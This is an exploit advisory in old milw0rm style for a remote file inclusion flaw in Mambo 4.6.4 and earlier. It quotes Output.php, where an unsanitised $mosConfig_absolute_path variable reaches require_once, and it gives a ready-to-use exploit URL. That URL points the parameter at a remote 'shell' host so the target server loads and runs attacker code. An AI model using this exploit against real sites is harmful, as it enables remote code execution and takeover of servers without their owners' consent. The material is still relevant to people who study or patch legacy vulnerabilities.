@@ -1,0 +1,36 @@
+.-----------------------------------------------------------------------------.
+|  vuln.: Mambo <= 4.6.4 Remote File Inclusion Vulnerability                  |
+|  download: http://mambo-foundation.org/                                     |
+|                                                                             |
+|  author: irk4z@yahoo.pl                                                     |
+|  homepage: http://irk4z.wordpress.com/                                      |
+|                                                                             |
+|  greets to: all friends  ;)                                                   |
+'-----------------------------------------------------------------------------'
+
+# code:
+
+ /includes/Cache/Lite/Output.php :
+ 1     <?php
+ 2
+ 3     /**
+ 4     * This class extends Cache_Lite and uses output buffering to get the data to cache.
+ 5     *
+ 6     * There are some examples in the 'docs/examples' file
+ 7     * Technical choices are described in the 'docs/technical' file
+ 8     *
+ 9     * @package Cache_Lite
+10     * @version $Id: Output.php,v 1.1 2005/07/22 01:57:13 eddieajau Exp $
+11     * @author Fabien MARTY <fab@php.net>
+12     */
+13
+14     require_once($mosConfig_absolute_path . '/includes/Cache/Lite.php');
+   ...
+   
+^ no comment.. RFI in line 14..
+
+# exploit:
+
+ http://[host]/[path]/includes/Cache/Lite/Output.php?mosConfig_absolute_path=http://shell?
+
+# milw0rm.com [2008-06-13]
